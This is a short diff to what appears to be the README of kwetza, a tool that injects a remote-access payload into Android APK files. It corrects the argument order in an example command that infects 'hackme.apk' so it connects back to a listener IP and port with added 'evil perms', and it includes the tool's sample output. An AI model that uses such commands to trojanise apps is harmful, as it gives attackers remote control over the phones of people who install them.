@@ -36,7 +36,7 @@ python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no
 * yes = include "yes" to inject additional evil perms into the app, "no" to utilize the default permissions of the app.
 
 ```
-python kwetza.py hackme.apk 10.42.0.118 https 4444 yes
+python kwetza.py hackme.apk https 10.42.0.118 4444 yes
 [+] MMMMMM KWETZA
 [*] DECOMPILING TARGET APK
 [+] ENDPOINT IP: 10.42.0.118
